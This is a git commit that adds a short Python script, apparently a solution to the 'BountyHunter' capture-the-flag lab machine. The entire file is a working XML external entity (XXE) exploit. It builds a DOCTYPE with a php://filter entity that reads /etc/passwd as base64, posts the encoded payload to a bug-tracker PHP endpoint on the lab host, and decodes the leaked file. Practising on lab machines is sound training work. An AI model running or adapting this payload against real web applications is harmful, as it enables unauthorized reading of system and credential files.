2ea1b2b9379bcb764b040dfb4a19fec4fc1163d7
LIANG-TSO <62923957+a6232283@users.noreply.github.com>
2024-05-21 03:40:05 -0700

    Add files via upload

---
+++ code/BountyHunter-xee_attack.py
@@ -0,0 +1,26 @@
+#!python3
+import requests
+import base64
+
+file='/etc/passwd'
+
+payload=f"""<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE data [
+<!ELEMENT stockCheck ANY>
+<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource={file}">
+]>
+		<bugreport>
+		<title>&file;</title>
+		<cwe>123</cwe>
+		<cvss>123</cvss>
+		<reward>123</reward>
+		</bugreport>""".encode()
+
+payload_b64=base64.b64encode(payload).decode()
+#print (payload_b64)
+data={"data":payload_b64}
+r=requests.post("http://10.10.11.100/tracker_diRbPr00f314.php",data=data)
+#print (r)
+output=r.text.split('>')[5][:-4]
+#print (output)
+print (base64.b64decode(output).decode())
